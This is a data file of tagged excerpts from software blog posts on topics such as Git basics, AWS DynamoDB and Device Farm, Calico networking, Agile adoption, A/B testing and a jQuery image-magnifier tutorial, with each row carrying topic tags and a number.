2846,"Id love it if people tried this exercise more broadly. I think it might be something that should become standard for interview teams at most companies. If you give it a try, email me at ammon@ __url__ and let me know how it went. [1] Ive interviewed over 1000 people since starting Triplebyte. Some of the them probably dont feel that I was humble when I spoke with them. All I can say to this is Im sorry if I did a bad job interviewing you. Everything I write about here I apply to myself. [2] This exercise actually just started as me trying to hire for our interview team. Part of the evaluation process that I used was asking candidates to interview me (it got really meta). To make these interviews more interesting, I gave a mix of (my attempt at) good and bad answers, and I noticed how illuminating their feedback was, and how this got them to give honest feedback on my good answers.","['Hiring', 'Computer Science', 'Programming', 'Interviewing', 'Training']",0
2847,"Login to AWS Device Farm Create a project3. Upload APK file which is under test5. On configure a test page, select appium java testng and upload __url__ file Select Run your test in a custom environment radio button6. Configure YAML file to run test in custom environment through testng.xml Click on Edit button and configure the custom environment majorly for appium version and to control the tests through testng.xml. Given below is yaml file that Ive configured to run my automated android tests for Pliro Mobile app. You can copy paste as it is and save the nameyour YAML __url__ file7. Select Device pool or you can use the default one You can create your own device pool depending the number of devices required. Tests will run faster if you opt for a single device pool. Just simply click on Create a new device pool button and select the device.8. Specify device statejust leave this page as it is and move onto next page9. Grab a cup of tea and wait for results:-)11.","['Aws Device Farm', 'Testng', 'Appium', 'Maven', 'App Development']",7
2848,"If you choose to use Gradle, follow the steps below Understanding the build.gradle which is there in the cloned git repo Here the The Spring Boot gradle plugin which is added in the dependencies collects all the jars on the classpath and builds a single, runnable spring-boot-docker-0.1.0.jar, which makes it more convenient to execute and transport your service. It searches for the public static void main() method to flag as a runnable class. Also, It provides a built-in dependency resolver that sets the version number to match Spring Boot dependencies. Docker dependency is required to build the Docker The configuration also specifies the below thingsa task to unpack the fat jar filethe image name (or tag) is set up from the jar file properties, which will end up here as mydocker/spring-boot-dockerthe location of the unpacked jarfile, which we could have hard coded in the Dockerfilea build argument for docker pointing to the jar file Understand the A __url__ class which is there under the src folder in the cloned repo The class is flagged as a @Spring Boot Application and as a @Rest Controller, meaning its ready for use by Spring MVC to handle web requests. @Request Mapping maps / to the home() method which just sends a 'Hello Docker World' response. The main() method uses Spring Boots Spring Application.run() method to launch an application.","['Docker', 'Spring Boot', 'Spring', 'Java', 'Containerization']",7
2849,"One of the challenges in software development is to remain focused on delivering value to users. Interruptions and outages cause a lot of noise and distract engineers from planned work. Sometimes a bug escapes into production. Others, systems are on fire because of unexpected surge in traffic (at the risk of dating myself, this used to be known as the slashdot effect). Responding to these events comes with a sense of urgency and tends to raise the stress level of any engineering team. In the chaos, there is usually a lot of information floating around, many theories and much speculation.","['Agile', 'DevOps', 'Software Development', 'Computer Science', 'Programming']",12
2850,"We started off doing the obvious thing, finding answers on Stack Overflow. Tweaking knobs on the database, each time thinking Ah, of course this is the one weve been missing! Honestly, I had no idea there were so many critical configuration settings in My SQL. Each tweak forced us to play the waiting game to see if the spikes would occur again. When they inevitably did, we upgraded the size of the VMs and waited again (when in doubt, throw money at the problem). Made some more changes after digging through the pile of millions of queries available through the instrumentation, waited.","['Agile', 'DevOps', 'Software Development', 'Computer Science', 'Programming']",10
2851,"A few months after the problems started, I read a fantastic book by Carl Sagan: The Demon-Haunted World. This book was written over twenty years ago, but its lessons still ring true today. It encourages readers to apply critical thinking when subjected to new information. In other words: dont just take things at face value. It goes on to describe various methods that can be used to apply skeptical thinking to differentiate fact from fiction. The baloney detection kit is a set of tools that one can use to formulate an argument and better inform themselves.","['Agile', 'DevOps', 'Software Development', 'Computer Science', 'Programming']",4
2852,"If a change is made, how will we know it has been effective? The lack of falsifiability was one of the biggest pitfalls we fell into with the waiting game approach early on in our troubleshooting. Build a dashboard with meaningful graphs. Instrument the code to ensure the code path of the change is executed and behaving as expected. Theres a plethora of tools available to software engineers to provide them with visibility into the changes they make. Use them to prove or disprove a theory.","['Agile', 'DevOps', 'Software Development', 'Computer Science', 'Programming']",13
2853,"The database problem was eventually laid to rest. Significant investment was made to make this happen. Ultimately, the takeaway is that applying the scientific method when solving computer problems works. Ever since this experiment, Ive dug deeper to get to the bottom of problems. In a talk I listened to a while ago, the presenter said that computers either work or they dont. Theres no maybes or magic in it, and I couldnt agree more.","['Agile', 'DevOps', 'Software Development', 'Computer Science', 'Programming']",5
2854,"So lets get to it: Each project that you begin with requires a git storage unit called repository Any changes that you want to save must first be placed in an area called staging environment Once you placed modified items in the staging environment you can save them as a new version; this process is called commiting. When commiting you must always include a brief description on what has been done; each commit has its own unique IDThere are times when a client asks for changes, bugs are found in a version, or new features are needed. Imagine the project suddenly has a curveball thrown at it rather than going the right path, we need to be able to branch out and edit those accordingly Once you have done what is needed in a branch you can use merge to move the commits to the main branch (master/origin); known as masterremote is clone of the repository you are working on where at some stages you will pass back and forth your changes (this allows multiple people to work on a project together) usually existance of a centralized repository is important The ability to pass/receive information between repositories is called push and pull. Ideally it is best not to do the push and pull on the original (known as origin) repository, rather the child repositories should be passing data to it Using sites like __url__ gives you a quick graphical interface to using Git and get a quick overview of the most important information, but it also lets you fork (meaning copying a clone of a project to your own github account) and also discuss issues and problems with your team. Building a remote sycronization of a repository on your local server and github is also extremely easy To follow good standard of branching and using the Git version control an extension called git-flow should be installed. Where you usally create a branch called integration, define your production branch (usually master). git-flow will also ask for feature, release, hotfix, and support branches Some of the important git commands: Check for the latest version of git: gitversion Make sure to define who you are so that the commits that are made are saved under your name: git configglobal __url__ Hossein Jalali Make sure to define who you are so that the commits that are made are saved under your email: git configglobal __url__ hossein@edoramedia.com To create a git repositroy: git init foldername (no folder name makes a repositroy in the current folder you are at)Ready to save (add to staging area) STEP 1: git add filename Ready to save (commit) STEP 2: git commit (add a brief but understandable message to changes that have happened and save)Commit everything and save message without going into editor: git commit -a -m my message (the -a means all changes that have happened to multiple files add them all at once to the staging area prior to committment).","['Git', 'Github']",18
2855,"Try comparing, for example, your email installation with that of your competitor across the street. He has Exchange 2016 SP3 running on a 4-node cluster of Dell servers with Windows Server 2008 SP2 and EMC Symmetric for storage. He uses Active Directory for identity and Digital Rights Management add-on for better security. He is running this solution on VMware v Sphere 6.0 for server consolidation, Open Stack for management, and Symantec Net Backup 6.3 for archival. He is also using F5 appliances for load balancing and Cisco ASA as a Firewall. Except for that one Business Unit that came through an acquisition and has been running a different version of Exchange on HP servers with Net App filers and HP Open View Your setup, lets just say, is ever so slightly different.","['Cloud Computing', 'Enterprise Software', 'Private Cloud', 'Application Architecture', 'Security']",11
2856,"Over time, most IT organizations also make compromises based on budget constraints, time constraints, political constraints, new industry trends, M&A activity, and often even the whims of their personnel: HP for a few years, then Dell, then Cisco UCS. Windows for a while, then Red Hat. EMC Symmetrix for a few years because its the Cadillac solution and we need the best, followed by Net App filers, then Pure Storage. Oracle for the database while its hot, followed by SQL to save money, followed by Postgres since its free. A cool startup solution for load balancing followed by a more conservative approach when that startup goes out of business. This is how you end up with [architectural] spaghetti in your data center.","['Cloud Computing', 'Enterprise Software', 'Private Cloud', 'Application Architecture', 'Security']",10
2857,"Worse, most IT organizations cant keep track of required security patches for this dizzying array of software and hardware, resulting in embarrassing front page news and executive resignations when hackers break in through obscure channels, e.g., the HVAC system at Target! Heres a simple analogy to drive the point home: If I ask you to take me from point A to point B, would you take out your phone and call for an Uber or would you start ordering vehicle parts so you can assemble a car to fulfill the request? Even if you choose to take the latter route, I bet you wouldnt order the chassis from Toyota, the engine from Honda, and the steering wheel from GM! Then why are you doing that when you want to run the most critical business apps, the ones that your company depends on? On-prem software was once a necessity. Today, given the evolution of the internet and the availability of fat pipes, its just a recipe for disaster. Private clouds and Hyper-converged Infrastructure solve only a part of the problem but dont address the fundamental software integration issues Ive described above. Those dont even really exist given the architectural differences between private and public cloud deployments.","['Cloud Computing', 'Enterprise Software', 'Private Cloud', 'Application Architecture', 'Security']",16
2858,But the IT department is usually the last one to tell you that; their jobs are not best served by that answer. Nor are the operating system companies. Nor are the management solution providers.,"['Cloud Computing', 'Enterprise Software', 'Private Cloud', 'Application Architecture', 'Security']",0
2859,"The promise of the cloud is obvious. We standardize on one type of hardware, one operating system, one set of management tools. And, for all intents and purposes, we will always run the latest version of software. And we will offer you an SLAwhich means we have to constantly monitor service levels, something your IT department is probably not doing. And We will do immediate postmortems and Root Cause Analysis in the case of service failure and share the findings with the public. In such a world, the fewer variables the better. Choice is the enemy of simplicity and reliability.","['Cloud Computing', 'Enterprise Software', 'Private Cloud', 'Application Architecture', 'Security']",16
2860,"The actor model does not guarantee message order. In addition, one of the key features of the model is that an actor can process only one message at a time. These two features can be great for concurrent computation (for example, we dont need to apply any locks on any resource), but assembling requests from multiple actors becomes non-trivial. In a simple procedural system, wed call one service to get the parameters and then (if completed successfully) call another service to get the plotted trajectory. When thats complete, we know we have everything we need to generate the report. But if we want to compute the two pieces independently using actorswe cant (or shouldnt) wait for one actors response before calling the other.","['Scala', 'Akka', 'Actors']",3
2861,"Email Tabs is a browser add-on that makes it easier to compose an email message from your tabs/pages. The experiment page describes how it works, but to summarize it from a technical point of view: You choose some tabs The add-on gets the best title and URL from the tab(s), makes a screenshot, and uses reader view to get simplified content from the tab It opens a email compose page It asks you what you want your email to look like (links, entire articles, screenshots)It injects the HTML (somewhat brutally) into the email composition window When the email is sent, if offers to close the compose window or all the tabs youve sent Its not fancy engineering. It does not propose a new standard for composing HTML emails. It doesnt pay attention to your existing mail settings. It does not push forward the state of the art. Notably, no one in Mozilla ever asked us to make this thing. And yet I really like this add-on, and so I feel a need to explain why.","['Firefox', 'Email']",19
2862,"People will apologetically talk about emailing themselves something in order to save it, even though everyone does it. It can be a note for the future, something to archive for later, a message, a question, an FYI. One of the features of Email Tabs that Im fond of is the ability to send a set of tabs, and then close those same tabs. Have a set of tabs that represent something you dont want to forget, but dont want to use right now? And unlike structured storage (like a bookmark folder), you can describe as much as you want about your next steps in the email itself.","['Firefox', 'Email']",17
2863,"The obvious solution is to make something that emails out a page. A little web service perhaps, and you give it a URL and it fetches it, and then something that forwards the current URL to that service What seems simple becomes hard pretty quickly. Of course you have to fetch the page, and render it, and worry about Java Script, and so on. But even if you skip that, then what email address will it come from? Do you integrate with a contact list? How do you let people add a little note? Prepopulating an email composition answers a ton of questions: All the mail infrastructure From addresses, email verification, selecting your address, etc To field, CC, address book The editable body gives the user control and the ability to explain why they are sending something Its very transparent to the user what they are sending, and they confirm it by hitting Send Since then Ive come to appreciate the power of editable documents. Again it should be obvious, but theres this draw any programmer will feel towards structured data and read-only representations of that data. The open world of an email body is refreshingly unconstrained.","['Firefox', 'Email']",19
2864,"But what does broken really mean? I suspect if we looked more closely we might be surprised. The simple answer: something is broken if it doesnt act the way it should. If you click a link and M __url__ opens up, and you dont use Mail.app, thats broken. To Mozilla developers, if M __url__ is your registered default mail provider, then it should open up. Email Tabs doesnt offer particular insight into this, but I do like that weve created something with the purpose of enabling a successful workflow. Nothing is built to a spec, or to a standard, its only built to work. I think that process is itself revealing.","['Firefox', 'Email']",19
2865,"We asked questions about saving, sharing, and revisiting content, and we got back answers on those topics. Were those the right questions to ask? They seem pretty good, but theres other pretty good questions that will lead to very different answers. What makes you worried when you use the web? What do you want from a browser? What do you think about Firefox? What do you use a browser for? What are you doing when you switch from a phone to a desktop browser? Weve asked all these questions, and they point to different answers.","['Firefox', 'Email']",17
2866,"I know what Email Tabs isnt: its not part of any strategy. Its not part of any kind of play for anything. This makes its future very hazy. And it wont be a blow-up success. But I like it, and I hope we do more.","['Firefox', 'Email']",6
2867,"This multi-language multi-runtime world requires a development tool that treats all environments as equal first-class citizens: these different environments should run side-by-side in the UI, while still providing the features that developers expect from an IDE for that language (for example, content assist/intellisense). Microclimate lives in this brave new polyglot world, allowing you to create Java/Node/Spring/Swift applications that work together and exist side-by-side within a single consistent UI. Within this environment we include full real time code intelligence powered by the Language Server Protocol (LSP) technology. Microclimate is one tool to rule them all! When you download the Microclimate installer, you will see it is a tiny file: only about 750KB. This is because when you extract and run it, the full contents of Microclimate will download as a self-contained set of Docker images. Microclimate exists entirely within these pre-built Docker images, and the footprint on your machine that is outside these containers is limited to the source code of your Java/Spring/Swift/Node projects.","['Docker', 'Software Development', 'DevOps', 'Cloud', 'Kubernetes']",19
2868,"The secret sauce we used here is meta-analysis, a simple yet powerful method of analyzing related analyses. We adopted this methodology to identify time-varying treatment effects. One frequent application of this method in healthcare is to combine results from independent studies to boost power and improve estimates of treatment effects, such as the efficacy of a new drug. At a high level: If outcomes from independent studies are consistent as shown in the following chart (left side), the data can be fitted with a fixed-effect model to generate a more confident estimate. The treatment effect of five individual tests were all statistically insignificant but directionally negative. When pooled together, the model produces a more accurate estimate, as shown in the fixed-effect row.","['Data Science', 'Experiment', 'A B Testing', 'Meta Analysis', 'Statistical Inference']",14
2869,"More details can be found in this reference. fixed-effect model versus random-effect model) can be leveraged to test whether heterogeneous treatment effects are present across time dimensions (e.g., time of day, day of week, week over week, pre-/post-event). We conducted a comprehensive retrospective study in A/B tests on the signup flow. As expected, we found most tests do not demonstrate strong heterogeneous treatment effects over time. Therefore, we could have ended some tests early, innovated more, and brought an even better experience to our prospective customers sooner.","['Data Science', 'Experiment', 'A B Testing', 'Meta Analysis', 'Statistical Inference']",6
2870,"Assuming that a treatment effect is both time-invariant (evaluated by meta-analysis) and sufficiently large, we can apply various optimal-stopping strategies to end tests early. Naively, we could constantly peek at experiment dashboards, but this will inflate false positives when we mistakenly believe a treatment effect is present. There are scientific methodologies to control for false positives (Type I errors) with peeking (or, more formally, interim analyses). Several methods have been assessed in our retrospective study, such as Walds Sequential Probability Ratio Tests (SPRT), Sequential Triangular Testing, and Group Sequential Testing (GST). GST demonstrated the best performance and practical value in our study; it is widely used in clinical trials in which samples are accumulated over time in batches, which is a perfect fit our use case. This is roughly how it works: Before a test starts, we decide the minimum required running time and the number of interim analyses.","['Data Science', 'Experiment', 'A B Testing', 'Meta Analysis', 'Statistical Inference']",13
2871,"Lets break down your server load into following types: Static API calls Calls whose response doesnt change in a quantum of time. The quantum could be 15/30/60 mins. The configuration call for mobile app requires a database request to fetch the latest value. However, your mobile app configuration doesnt change much over a period of time.","['Nodejs', 'Product Management', 'Rabbitmq']",11
2872,"In summary, youve effectively broken down the problem of overloaded servers into smaller, easier to deal with problems of request typesbyunderstandingwheretheproblemis,through New Relic. And that is a key thing to learn when youre out solving problems everydaythe biggest problems require understanding the smaller problems that make up the big ones and then solving the smallest problems. You solve the small things first, the big things will probably disappear! How is your load being distributed? Have you tried the method above? Id love to hear about itdrop me a line.","['Nodejs', 'Product Management', 'Rabbitmq']",10
2873,"First, try the software, install it and have a play, try to break it, see if it does what it says on the box. This is a great place where you can start to add value very easily, by reporting any issues you find. Each project is likely to have a slightly different template for reporting issues, but essentially they all contain similar information. (You can find Minds DBs Issue template here)Once you have figured out the project you want to contribute to, explore its Github repository, read the documents and go to the issues tab. Here you will find all the open issues that you can work on. These issues can be from beginner level to advance level. If the repository is properly maintained, the issues would be tagged with beginner, first-timers, help-wanted etc. so that you can work on the easiest tasks to gain confidence and experience with the project.","['Open Source', 'Github', 'Free Software', 'Tech']",18
2874,"As an open source developer, you can attend conferences and events related to coding and technology. You can check out different events on Github Explore and try to attend those events close to you. Minds DB will be organising meetups throughout 2019; if youd like to stay up to date with everything MInds DB you can subscribe to our mailing list here Generally speaking, you are not paid for doing open source development as most of the work done is volunteered. However, if you cannot afford to spend unpaid time in open source development, you can either talk to your employer and pitch the idea for a project that may interest your employer as well or find a project which pays its open source developer. You can learn more from Githubs guide of getting paid for open source development. Many companies (including Minds DB) also hire or pay top contributors for their work.","['Open Source', 'Github', 'Free Software', 'Tech']",6
2875,"When you want to create a Github project or repository you can optionally create a Readme file to explain to the world what your project is all about. Its ugly and nothing like the Medium experience. Most programmers create projects on Github because they want others to help and collaborate. Unfortunately many projects look very similar to this one: As of today there are almost 100 million project repositories on Github. If you are seeking to help on a project or find others to help on your project, the above example is not exactly the most inspiring. It doesnt even have a Readme file to introduce the project, the goals, the milestones or even explain what the code is about. Heres another vague project for a chatbot which does not even have a description: Compare this to some of the more well documented projects. The following project not only has a Readme but includes graphics, a structured layout and even examples: The intention of my open-source project, Algohive is to build on these best practices for easier contributor on-boarding, styling, project documentation, and roadmapping. I did need to learn a lightweight styling syntax called Markdown. All said and done, even a non-programmer like myself was able to figure it out without too much fuss.","['Github', 'Open Source', 'Crowdsourcing', 'Coding', 'Collaboration']",19
2876,"When it comes to Kubernetes networking, Calico is widely used. One of the main reasons being its ease of use and the way it shapes up the network fabric. Calico is a pure L3 solution, where packets are routed in just the same manner as your regular Internet. VM) acts like a v Router, which means tools like traceroute, ping, tcpdump, etc just work as expected! Whether the packet is flowing from one container to another or container to another node (or vice-versa), its just treated as a flat network route (L3 hops). By default, there is no notion of overlays, tunneling or NAT. Each endpoint is actually a /32 IP in IPv4 (or equivalent in other), which means a container can be assigned a public IP. All this is achieved using the Linux kernels existing network capabilities. This gives a great flexibility in scaling out the network fabric of a platform running atop Calico.","['Kubernetes', 'Containers', 'Networking', 'Software Engineering', 'Docker']",11
2877,"Once the agent is launched, you should see the following logs: Check if the nodes are registered: At this point, we can hope that both the nodes (agents) have discovered each other. To verify, run the following on one of the nodes: This shows that the peering is established between the nodes. Now, we will create an ip-pool for the workload containers to get the IP from. Heres the config: With block Size set to 26, each node will be given a /26 chunk from the larger /16 CIDR, out of which the IPs will be assigned to the containers launched on the respective node. Encapsulation is needed for packets flowing between the containers located on nodes that are in different subnets. The packets get encapsulated under another packet with the src and dst IP of the nodes involved in the flow. Useful when traversing the subnet boundaries (unless the router is BGP-aware). nat Outgoig=true will masquerade the traffic that is destined outside the ip-pools CIDR.","['Kubernetes', 'Containers', 'Networking', 'Software Engineering', 'Docker']",11
2878,"Heres a simple CNI config that we will use: We will place this config into /vagrant/net.d/ and the plugins into /vagrant/bin/ on both the VMs. To add the containers to the network, we will run the following command on both the VMs. Before we do that, we need to set the container_name to the name (or ID) of the container. and we should see the following output (eg. from one of the containers output)Here, we can see that this particular container got assigned IP10.1.240.64. We should be able to ping this container from a container on another VM. In the case below, the container that we are pinging from, was assigned IP 10.1.134.128.","['Kubernetes', 'Containers', 'Networking', 'Software Engineering', 'Docker']",7
2879,"It is important to identify what we wish to avoid:desensitization, which causes programmers to ignore build failures and, eventually, actual problemsautomatic retry e.g. flaky, which masks underlying bugs in tests The latter is particularly insidious. Once introduced, the incentives and disincentives are completely out of whack. What stops us from increasing the number of retries from 3 to 5, and from 5 to 10? First, we need to own our technical debt, including the ones left by our predecessors. Acknowledge it on the metaphorical balance sheet, and stop tossing it away as someone elses problem. This has to be part of the job. It has to be recognized and rewarded as part of performance review, promotions, and bonuses.","['Continuous Integration', 'Software Development', 'Testing', 'Software Engineering']",13
2880,"The primary challenge is Agile In Name Only. It can manifest itself in a number of ways. The first common way is for a situation to carry the name Agile, and maybe even look Agile, when in reality it is anything but. A situation a senior Product Owner at a financial institution described to me as: Agile 3.0, now with extra top down. He was referring to a major project with multiple Agile teams that was using Agile on a day-to-day basis but was also expected to deliver the project fixed budget, fixed scope, and fixed deadline. This was in an otherwise mature Agile organization.","['Agile', 'Scrum', 'Transformation', 'Lean Startup', 'Scaled Agile Framework']",12
2881,"This trend is mirrored in the fact that many organizations pretend to be more Agile than they actually are. This may be partially driven by an interesting megatrend affecting Agile today: the war on talent. Qualified people are getting scarcer and scarcer. This week for instance, I spoke to a leading Agile Coach at a well know brand that was struggling to find good scrum masters and Agile Coaches. Presenting yourself as an Agile organization may help in recruiting young people especially (not just scrum masters, coaches etc.). Therefore expect this trend to continue in 2019 and the foreseeable future.","['Agile', 'Scrum', 'Transformation', 'Lean Startup', 'Scaled Agile Framework']",1
2882,"A rather special kind of Agile In Name Only is machine room agilism. Many coaches report seeing this more and more as Agile starts to be adopted by follower, rather than early adopter organizations. It is personified in managers that seem to champion Agile, but only do so to serve their personal interest. While they can lever the power of Agile teams to increase innovation and development speed in their organization or department they will support the Agile movement in an organization. But as soon as they will have to change their own behavior they will drop their support. To their mind Agile is only for the production floor. This is a dangerous trend, because it weakens an Agile movement at a key turning point in a transformation.","['Agile', 'Scrum', 'Transformation', 'Lean Startup', 'Scaled Agile Framework']",12
2883,"Agile is fast becoming a commodity of sorts. This is clearly exemplified by the entry of large consultancy firms into the market. On the one hand they are very welcome, they have the clout to convince the upper echelons of management and their entry is a clear signal that Agile is starting to become the new normal. On the other hand they are a clear reflection of what is sometimes referred to as the Agile Industrial Complex. There is money to be made in selling Agile. Which is fine, if what is being sold is true Agile. Too often, however, selling Agile involves selling Agile frameworks or methodologies without consideration for the things that truly matter, the mindset and ideas behind the frameworks.","['Agile', 'Scrum', 'Transformation', 'Lean Startup', 'Scaled Agile Framework']",12
2884,"Inevitably, we will (start to) see failed or incomplete transformations. This will cause many to become even more skeptical towards Agile. In the past Lean has suffered from a similar backlash. In many organizations it is not uncommon to hear we survived Lean, we will survive this. The value of Lean principles has not gone away, yet the inherent inertia and resistance to change in many organizations has resulted in an unsuccessful adoption. As more organizations will try to adopt Agile and fail because they underestimate the challenges involved or simply because they want the benefits without putting in the work and making the hard choices.","['Agile', 'Scrum', 'Transformation', 'Lean Startup', 'Scaled Agile Framework']",12
2885,"One of the most curious challenges pertains to leadership in organizations that first start out on a path towards transformation. Being a senior leader in an organization is not an easy job at the best of times. Now imagine coming face-to-face with something that goes completely against everything you have always known, something like Agile. Agile likes to turn things completely on its head, in fact that is one of my favorite things about it. However this, coupled with the fact that Agile is now trendy, makes it a difficult beast to handle for many managers. For them, it has until now been a thing that some of those IT teams do.","['Agile', 'Scrum', 'Transformation', 'Lean Startup', 'Scaled Agile Framework']",12
2886,"This tutorial exists as an archive of the original publication, written in 2010 using j Query 1.4.2. It supports Internet Explorer 6 and still functions the same to this day in modern browsers, as evidenced by the live demo. Some of the coding examples put forth in the coming sections may not seem optimal, and youre right. They do not make use of such technologies as flex boxes or alpha-opacity. These simply did not exist at the time. Beta browser features were also ignored in favor of cross-browser compatibility. As a result, this tutorial is backwards compatible by more than a decade. While I would no longer recommend a lot of these practices, there is no need to reinvent the wheel. The product in this tutorial is in working order and a rewrite would achieve nothing more than sacrificing backwards compatibility.","['Web Development', 'Jquery', 'Web', 'Tutorial', 'JavaScript']",19
2887,"Now to explain the blur algorithm and its CSS. Its a very simple idea, really, made especially easy with j Querys built-in translucency handler. You merely take a translucent image (I use 80% visibility for this magnifier) thats been shifted to the left 3px, and place it over the same translucent image shifted up 3px. Then place those two images over the same translucent image shifted to the right 3px. Then place those three images over the same translucent image shifted down 3px. Seeing partially through each image will result in a blur effect.","['Web Development', 'Jquery', 'Web', 'Tutorial', 'JavaScript']",14
2888,"Now that you understand how it blurs, youll easily understand the CSS for it: We also have some dynamic CSS [in that it changes on a per-magnifier basis] that is referenced very often in the Java Script. Ive compressed it into a quick-access variable since that makes it easier to use each time than typing out each string.css Common.background is the background image of the thumbnail, as it will be needed for div.thumbnail, div.box, and every div involved in blur. It then becomes much easier to reference it each time as css Common.background than its string equivalent.css Common.background Large is the background image of the popup. This variable is only used twice (once for the inner algorithm and once for the other effect algorithms), so is not nearly as common as the thumbnail background.css Common.dimensions is merely the dimensions of the thumbnail. Just like the background image, this applies to div.thumbnail and the blur divs. It does not apply to div.box, since its width is determined by the dimension ratio between the low-resolution and high-resolution images; but it does apply to __url__ which will need to overlay the thumbnail.","['Web Development', 'Jquery', 'Web', 'Tutorial', 'JavaScript']",14
2889,"The ratio variable is a measurement of popup to thumbnail. So a popup of 500 width and a thumbnail of 250 width would have a __url__ of 2. thumbnail.x / ratio.x (where x is height or width) means that 1 / ratio.x is the percentage of the popup that will be shown. If the ratio of popup to thumbnail is 2:1, then 1/2 of the popup is what will be shown when magnified. For this ratio, the box should be 1/2 of the thumbnail. If the ratio of popup to thumbnail is 5:1, then 1/5 of the popup is what will be shown when magnified. For this ratio, the box should be 1/5 of the thumbnail. Thus, the box needs to be 1/ratio.x * thumbnail.x (or thumbnail.x / ratio.x).","['Web Development', 'Jquery', 'Web', 'Tutorial', 'JavaScript']",14
2890,"There are also small manipulations that apply to both the inner, blur, and tint effects. Instead of redundantly placing these snippets in both the if and else statements, well execute them outside of the statements. They will need to go after the conditional because div.image-magnify must first exist in order for it to be manipulated.data() is a very useful j Query method that allows you to assign various attributes to an element. One cannot assign the attribute (attr()) of popup Height to div.image-magnify because that is not a valid HTML attribute. Thankfully, j Query will store it in that elements data() so that one may access it later via $(""#the-element"").data(""popup Height""). effect.border Width, popup.height, popup.width, thumbnail.height, and __url__ are all variables you will need to access in the future. They will be needed for calculations in various event handlers, which wont be able to read the data sent to the image Magnifier() function, so we thus store them in an easy-to-access location: the div.image-magnifys data().","['Web Development', 'Jquery', 'Web', 'Tutorial', 'JavaScript']",15
2891,"For those unaware, Ill explain the variables used to calculate x and y. e.page X is the mouses horizontal position on the page: the number of pixels the mouse is from the far left of the browser window or frame. __url__ is the horizontal position of the thumbnail on the page: the number of pixels the thumbnail is from the far left of the browser window or frame. By subtracting __url__ and data.border Width (the border width of the thumbnail) from e.page X, you are left with the mouses position in relation to the thumbnail. For example, if your mouse is positioned at the top left of the thumbnail, x will be 0 and y will be 0; if the mouse is positioned at the bottom middle of a 320240 thumbnail, x will be 160 and y will be 240.div.popups background positioning is a bit more complicated. The CSS for background positionunlike padding, margin, __url__ comprised of the left position of the background followed by the top position of the background. Since the thumbnail is smaller than the high-resolution popup, this is where ratio comes into play. For every one pixel the mouse scrolls over the thumbnail, we want to move ratio.x pixels in the popup; e.g. if the popup is three times the size of the thumbnail, well want it to move three pixels for every pixel the mouse moves over the thumbnail. Your algorithm would then be x * __url__ and y * ratio.height.","['Web Development', 'Jquery', 'Web', 'Tutorial', 'JavaScript']",14
2892,"So how do we move the position from the far left to the center? You must first note the negative before the value in the CSS. The number we are calculating is how many pixels to the right the image should move; by using a negative, we thus make the image shift to the left. Beware the double negative in the following algorithm. -(a-b) actually means -a + b (moved a pixels to the left, then b pixels to the right). The uncondensed algorithm for determining the number of pixels to move the image to the left is this: x * __url__ - x / data.thumbnail Width * data.thumbnail Width. That is to say, the pixels position in the full-resolution image (x * ratio.width) minus the percentage of the image scrolled (x / data.thumbnail Width; were at pixel x out of data.thumbnail Width pixels) times the number of pixels total (data.thumbnail Width). In English, the further we scroll to the right, the more well want to subtract from x * ratio.width, up to 100% of the thumbnail width. When x is equal to data.thumbnail Width (i.e. the mouse is at the far right of the thumbnail), well be left with x * __url__ - 1 * data.thumbnail Width.","['Web Development', 'Jquery', 'Web', 'Tutorial', 'JavaScript']",14
2893,"For those wondering, it is entirely possible to use the mouse boxs algorithm in the inner magnification [without displaying the mouse box, of course]. I chose not to do so for one entirely aesthetic reason. When the box has reached the dimensions of the thumbnail, scrolling of the popup ceases. This isnt very noticable with the mouse box, because you expect it to stop when the boxs border hits the thumbnails border. However, when there is no border guiding you, like with the inner magnification, it appears less fluid and more choppy. To see the difference for yourself, place your mouse in the bottom right corner of any of the magnification examples at the beginning of this tutorial. If you move it slightly to the left or up, nothing changes; the mouse box is still positioned as far to the bottom and right as it can go. However, if you do the same thing in the inner magnification example, it will scroll regardless of where your mouse is. It does not stop scrolling until your mouse is physically at the far right or far bottom of the thumbnail.","['Web Development', 'Jquery', 'Web', 'Tutorial', 'JavaScript']",14
2894,"This is because in SQL, the index is used to find a direct access pointer to the actual record or the bucket of records. But in Dynamo DB, creating an index will result in creating a new table. We have to define what attributes to be projected to that newly created index table. We can set the index to project all attributes in the parent table but that will increase the cost as you have to pay for the storage in Dynamo DB. But if you define only a selected set of attributes with the index for projection, you can retrieve only those set of attributes using that index. If you try to retrieve an attribute that is not projected to the index, it will perform a scan in the parent table, making your index useless. Therefore, you must carefully decide what the attributes to be indexed will be, and what attributes are to be projected with each index.","['AWS', 'Technology', 'Innovation', 'Amazon', 'Sri Lanka']",8
2895,"The AWS web console can be used to view the data of Dynamo DB tables, but this console has very limited querying capabilities, making the development and testing tasks cumbersome. Some of the limitations are as follows:1. Only 100 items are displayed once. If you want to check the 1000th item of a table, you must press the next button 10 times until the 901st to the 1000th items are displayed.2. Cannot insert/update multiple data items in one operation. You need to insert/update them individually.3. Can only delete multiple items by ticking them with the checkbox. You cannot use queries/conditions to delete data in the console.4. You can export existing data of the table to a CSV file, but there is no option to import that data again. And export is also possible only in batches of 100 items.","['AWS', 'Technology', 'Innovation', 'Amazon', 'Sri Lanka']",8
2896,"With Dynamo DB however, auto-scaling tends to be somewhat problematic. Even though you set scale up and scale down alarms, it wont scale immediately to cater peak/burst loads. According to our investigations, it will take nearly 15 minutes to scale up. To further clarify, lets say that the provisioned read capacity has been set to 25 and that a load test is started on the application which reads data from a Dynamo DB table. Lets also assume the concurrency of the load test is 50 and the load is continuous. You will notice that the requests will start to timeout. If you check the current provisioned capacity of the Dynamo DB table in the AWS console, you will see that its still at 25 and auto-scaling has not been triggered yet. This behavior has been explained in detail here.","['AWS', 'Technology', 'Innovation', 'Amazon', 'Sri Lanka']",11
2897,"If your application needs to respond to burst loads you need to configure DAX for your Dynamo DB tables as recommended, but there are some limitations associated with DAX as well. You can find a complete list here under usage notes. There is one annoying limitation which is worth mentioning here. A VPC must be assigned for the DAX cluster and the DAX can only be accessed from an EC2 instance running inside the same VPC as the DAX cluster. This means that you cannot access DAX from your development machine even though your VPC has public internet connectivity. This will make the development tasks almost impossible with DAX. DAX is also not included in the AWS java SDK out of the box and is not available as a maven dependency either, therefore, you have to install it as a separately downloaded jar.","['AWS', 'Technology', 'Innovation', 'Amazon', 'Sri Lanka']",11
